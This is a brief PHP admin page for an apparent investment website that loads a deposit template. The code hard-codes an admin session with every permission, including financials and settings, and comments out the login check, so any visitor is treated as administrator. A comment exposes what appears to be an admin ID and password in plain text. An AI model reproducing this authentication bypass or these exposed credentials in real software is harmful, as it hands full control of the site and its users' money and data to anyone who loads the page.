<?php
session_start();
error_reporting(0);
require 'include/connect.php';



// ID: NA7CAy246C@sh218SF6scsfw1g
// PW: qwerty@#asdf#zxcv@2019
	 $_SESSION['aid']=1;
		$_SESSION['adminuser']=  'NA7CAy246C@sh218SF6scsfw1g';
		$_SESSION['permission']= 'User,Investment,Plan,Content,Financials,Preferences,Settings,Referral,SubAdmin,Support';

 if(empty ($_SESSION['adminuser']))
 {
   // echo '<meta http-equiv="refresh" content="0; url=index.php" />';
    //exit();
 }
 require 'include/header.php';
 require 'templates/deposit_merge.php';
 require 'include/footer.php';
  ?>
